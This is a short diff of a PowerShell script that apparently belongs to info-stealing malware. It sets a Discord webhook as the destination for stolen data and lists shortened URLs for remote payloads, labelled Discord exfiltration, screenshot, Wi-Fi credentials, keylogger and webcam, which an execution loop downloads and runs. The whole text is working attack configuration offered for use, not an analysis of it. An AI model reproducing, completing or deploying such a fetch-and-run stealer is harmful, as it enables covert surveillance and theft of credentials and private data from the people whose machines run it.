@@ -5,12 +5,12 @@ $Global:dc = "https://discord.com/api/webhooks/1323384833816133724/ehOw_K-Q-attn
 $payloads = @(
     "https://is.gd/bw_bh_to_dc",
     "https://is.gd/bwchdbdc",
-    "https://is.gd/3RVLLl",
-    "https://is.gd/8SpcqN",
-    "https://is.gd/b6GaOU",
+    "https://is.gd/3RVLLl", # exf dis
+    "https://is.gd/8SpcqN", # ss 
+    "https://is.gd/b6GaOU", # wifi
     # "https://is.gd/kRX8yM", old master
-    "https://is.gd/iDZWzF",
-    "https://is.gd/9eLMGc"
+    # "https://is.gd/iDZWzF", # keylogger
+    # "https://is.gd/9eLMGc" # webcam
 )
 
 # Execution Loop
